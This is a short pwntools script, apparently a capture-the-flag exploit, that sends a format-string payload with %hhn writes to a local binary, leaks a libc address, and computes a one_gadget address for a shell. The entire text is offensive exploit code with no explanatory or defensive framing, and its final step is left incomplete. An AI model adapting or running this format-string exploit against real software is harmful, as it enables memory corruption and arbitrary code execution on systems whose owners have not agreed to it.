from pwn import *

io = process("./back",env={"LD_PRELOAD":"./libc.so.6"})
payload = "%81x"+"%c"*7 + "%hhn" + "%52x"+"%7$hhn%17$p%14$p"

gdb.attach(io)#,"b*0x555555554a13\nc\n")
io.recvuntil("> ")
io.send(payload)
io.recv(92)

leak = int(io.recv(14),16)-0x21b97
one = leak + 0x10a45c
val = one&0xffffffff
io.interactive()
